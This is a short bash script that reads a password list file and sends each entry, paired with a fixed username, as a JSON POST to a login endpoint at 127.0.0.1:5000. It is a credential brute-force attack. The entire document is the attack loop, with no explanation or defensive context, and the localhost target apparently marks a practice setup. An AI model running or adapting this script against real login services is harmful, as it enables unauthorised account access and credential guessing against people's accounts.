#!/bin/bash

filecontent=( `cat "pass_brute_force.txt" `)

for t in "${filecontent[@]}"
do
curl --silent -X POST -d '{"username":"Juanba","password":"'${t}'"}' https://127.0.0.1:5000/login
done